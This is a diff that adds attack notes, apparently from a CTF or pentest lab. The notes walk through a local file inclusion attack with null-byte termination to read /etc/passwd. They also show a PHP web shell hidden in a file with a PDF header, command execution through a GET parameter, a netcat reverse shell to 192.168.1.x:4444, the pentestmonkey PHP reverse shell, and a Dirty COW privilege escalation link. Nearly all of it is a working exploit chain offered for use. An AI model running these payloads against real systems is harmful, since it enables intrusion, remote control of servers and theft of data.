@@ -1,0 +1,28 @@
+To directly run some command, null terminate the string to strip off the .php that the server adds to the page variable.
+index.php?page=../../etc/passwd%00
+
+You can upload whatever payload you want in a pdf file as long as you have the
+%PDF-1.5
+header
+
+You can upload a blank .pdf and inject payload with burp OR just upload each payload as separate pdfs.
+
+The pdfs end up in (/var/www)/uploads
+
+To strip .php run them with null termination index.php?page=uploads/payload.pdf%00
+
+RUN ARBRTRARY COMMAND:
+%PDF-1.5
+<?php system($_GET['c']);?>
+index.php?page=uploads/runcommand.pdf%00c=ls
+
+replace ls with whatever commands e.g. connect to `nc -l -p 4444`
+runcommand.pdf%00c=nc -e /bin/bash 192.168.1.x 4444
+
+REVERSE SHELL:
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+change the ip/port in php-reverse-shell.pdf
+run netcat listener nc -v -n -l -p 4444
+index.php?page=uploads/php-reverse-shell.pdf%00
+
+Dirtycow priv https://www.exploit-db.com/exploits/40839
